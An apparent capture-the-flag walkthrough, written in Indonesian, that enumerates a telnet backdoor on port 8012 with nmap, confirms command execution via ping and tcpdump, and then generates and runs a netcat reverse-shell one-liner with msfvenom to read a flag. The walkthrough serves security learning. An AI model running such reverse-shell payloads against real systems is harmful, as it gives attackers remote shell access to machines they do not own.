# Understanding Telnet

merupakan protokol aplikasi yang memungkinkan kita untuk dapat terhubung dan mengeksekusi command di remote machine yang dihosting oleh telnet server. Telnet mengirim semua pesan dengan clear text tanpa ada mekanisme keamanan yang spesifik seperti enkripsi, dan kebanyakan sudah digantikan dengan ssh. Kita dapat terhubung dengan telnet server menggunakan command

```shell
telnet <IP> <PORT>
```

# Enumerating Telnet

lakukan port scanning terhadap ip target menggunakan nmap, dalam hal ini kita menggunakan tag all port (`-p-`) dan tag open ports (`--open`) untuk melihat semua port yang kemungkinan terbuka.

```shell
sudo nmap <IP> -p- --open
```

hasilnya

```shell
Connect Scan Timing: About 73.79% done; ETC: 18:50 (0:00:35 remaining)
Nmap scan report for 10.10.59.6
Host is up (0.37s latency).
Not shown: 64306 closed tcp ports (conn-refused), 1228 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8012/tcp open  unknown
```

dari hasil yang didapat, dapat dilihat bahwa ada 1 port terbuka dari semua port yang ada, namun tidak ada keterangan service pada port tersebut. Jika kita coba untuk menghilangkan `-p-` juga tidak akan ada port yang terbuka, maka kita dapat melakukan investigasi lebih lanjut pada port `8012` tersebut. Kita dapat melakukan aggresive scanning dengan tag A (`-A`)

```shell
nmap -p8012 <IP> -A
```

hasilnya adalah sebagai berikut

```
...
PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.94%I=7%D=9/28%Time=65157412%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
SF:x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
SF:x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BA
SF:CKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,
SF:2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n
SF:")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view
SF:\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Ty
SF:pe\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"SK
SF:IDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(H
SF:elp,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20t
SF:o\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDOO
SF:R\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E,
SF:"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%
SF:r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x2
SF:0commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
SF:x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20T
SF:ype\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SKI
SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LP
SF:DString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20co
SF:mmands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
SF:x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x
SF:20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'S
SF:\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDes
SF:k-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
SF:nds\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x2
SF:0to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20
SF:\.HELP\x20to\x20view\x20commands\n");
...
```

dari hasil enumerasi tersebut kita mendapatkan informasi bahwa terdapat 1 port yang terbuka yaitu port `8012`, dimana port ini berguna sebagai `backdoor` milik `SKIDY`.

# Exploiting Telnet

konek ke service telnet dengan informasi yang telah didapat saat proses Enumerasi. kita dapat menggunakan 

```shell
telnet <IP> 8012
```

saat kita baru masuk, akan ada welcome message seperti berikut

```shell
...
SKIDY'S BACKDOOR. Type .HELP to view commands
```

kita dapat menggunakan command `.HELP` untuk melihat informasi yang tersedia, dan yang kita dapat adalah

```shell
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
```

ketika kita lakukan `.RUN <command>` tidak keluar apapun, dan itu cukup aneh. Maka kita dapat mengecek apakah apa yang kita ketik dapat di exec sebagai system command, dengan cara membuat `tcpdump` listener pada local machine

```shell
sudo tcpdump ip proto \\icmp -i tun0
```

selanjutnya kita dapat melakukan ping ke target machine dengan cara

```shell
ping <IP target> -c 1
```

jika ping berhasil, maka pada tcpdump akan menghasilkan output

```shell
...
0:18:58.526706 IP 10.4.38.153 > 10.10.102.193: ICMP echo request, id 56179, seq 1, length 64
20:18:58.900791 IP 10.10.102.193 > 10.4.38.153: ICMP echo reply, id 56179, seq 1, length 64
```

hal ini menandakan kita dapat exec command di target box dan juga terhubung dengan local machine kita. Selanjutnya kita akan melakukan reverse shell untuk mewujudkan hal tersebut. Kita gunakan `msfvenom` untuk generate command yang digunakan untuk reverse shell dengan cara

```shell
msfvenom -p cmd/unix/reverse_netcat lhost=<IP tun0 local> lport=4444 R
```

dimana `-p` berarti payload yang akan digunakan, `lhost` berarti IP tun0 pada local machine yang kita gunakan, dan `lport` merupakan port yang digunakan untuk target terhubung ke local machine, dan `R` untuk export hasil generate payload dalam bentuk raw format. Nantinya akan menghasilkan payload berikut

```shell
...
mkfifo /tmp/sfvwx; nc <IP tun0 local> 4444 0</tmp/sfvwx | /bin/sh >/tmp/sfvwx 2>&1; rm /tmp/sfvwx
```

setelah kita dapatkan payload, kita akan gunakan netcat listener untuk pondasi reverse shell nya di local machine.

```shell
nc -lvp 4444
```

selanjutnya kita run payload hasil msfvenom tadi di target box dengan cara

```shell
.RUN mkfifo /tmp/sfvwx; nc <IP tun0 local> 4444 0</tmp/sfvwx | /bin/sh >/tmp/sfvwx 2>&1; rm /tmp/sfvwx
```

jika berhasil, nantinya netcat akan mendapatkan koneksi ke target, dan kita dapat memasukkan command disana untuk mendapatkan flag dengan command `ls` dan `cat`.
